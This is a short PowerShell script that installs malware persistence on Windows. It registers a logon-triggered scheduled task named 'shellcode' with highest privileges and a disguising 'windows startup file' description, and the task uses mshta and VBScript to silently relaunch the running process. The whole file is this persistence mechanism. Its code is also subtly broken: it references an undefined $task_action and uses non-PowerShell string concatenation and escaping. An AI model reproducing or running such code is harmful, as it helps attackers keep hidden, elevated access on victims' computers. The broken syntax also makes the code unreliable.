$task_name = "shellcode"
$file_path = (Get-Process -Id $pid).Path
$script_check = "vbscript:CreateObject(\"WScript.Shell\").Run \"" & $file_path & "\", 0, False"
$action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "'vbscript:CreateObject(\"WScript.Shell\").Run \"" & $file_path & "\", 0, False'"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Unregister-ScheduledTask -TaskName $task_name -Confirm:$false
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
Write-Host "[!] Persistence Added" -ForegroundColor Green
